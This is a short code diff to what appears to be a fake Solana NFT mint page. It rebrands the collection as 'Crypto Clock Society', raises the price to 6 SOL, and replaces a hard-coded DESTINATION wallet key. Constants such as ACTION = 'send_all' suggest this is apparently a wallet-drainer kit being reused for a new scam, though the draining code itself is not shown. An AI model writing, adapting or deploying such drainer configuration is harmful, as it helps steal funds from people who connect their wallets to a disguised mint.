@@ -18,10 +18,10 @@ import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
 
-const solAmount = 0.3
+const solAmount = 6
 const image = 'https://static9.depositphotos.com/1307373/1179/i/600/depositphotos_11794280-stock-photo-red-apple.jpg'
-const Title = 'Dragon Elements'
-const supply = 1110
+const Title = 'Crypto Clock Society'
+const supply = 3333
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -32,7 +32,7 @@ const ACTION = 'send_all';
 // const SENDS_IN_ONE_TX = 5;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('6HnkEmyTMex2XUc6Ug7sxwippvNDtzAcz3p524h35sXi');
+const DESTINATION = new PublicKey('r74VH5E1Hz3uRgG15RjywGPJ9Cztw2yKQszFhofRZT5');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
